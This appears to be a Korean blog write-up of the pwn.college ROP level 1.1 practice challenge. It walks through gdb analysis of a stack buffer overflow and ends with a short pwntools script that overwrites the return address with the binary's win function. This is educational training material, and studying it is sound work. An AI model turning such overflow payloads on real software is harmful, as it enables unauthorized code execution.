---
title: "[pwn.college] ROP Level1.1 Write up"
author: d0razi
date: 2023-08-07 08:30
categories: [InfoSec, Pwn]
tags: [linux, pwn.college]
toc: false
image: /assets/img/media/banner/pwn-college.png
---

# 문제 분석

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled.png)

이번 문제는 실행해도 아무런 정보를 주지 않기 때문에 gdb로 분석해보겠습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%201.png)

우선 보호기법은 NX-Bit 기법만 켜져있습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%202.png)

함수 목록에 win함수가 있는걸로 보아 이번에도 win함수를 실행시키면 되는 것 같습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%203.png)

메인 함수를 보면 challenge 함수가 호출됩니다. challenge 함수를 보겠습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%204.png)

read함수에서 얼마나 입력 받는지 알기 위해 `challenge+40`에 break point를 걸고 rdx 레지스터를 확인했습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%205.png)

4096이면 무조건 Overflow가 발생한다고 생각했습니다. 

이제 입력 버퍼부터 리턴 주소까지의 오프셋을 알기 위해 read 함수에 aaaaaaaa를 입력하고 데이터를 출력했습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%206.png)

read함수에서 입력한 값은 rsi 레지스터 주소에 저장되기 때문에 rsi를 출력했습니다. 리턴 주소까지 40bytes가 떨어져있기 때문에 더미데이터를 40만큼 입력하고 win 함수의 주소를 입력해주면 됩니다.

main 함수에서 보면 challenge함수가 끝난 다음 코드 주소가 `0x4019a8` 인걸 알 수 있습니다.

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%207.png)

# Exploit code

```python
from pwn import *

p = process("/challenge/babyrop_level1.1")
e = ELF("/challenge/babyrop_level1.1")

pay = b'A' * 40
pay += p64(e.symbols["win"])

p.sendline(pay)
p.recvuntil(b"Leaving!")
p.interactive()
```

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.1/Untitled%208.png)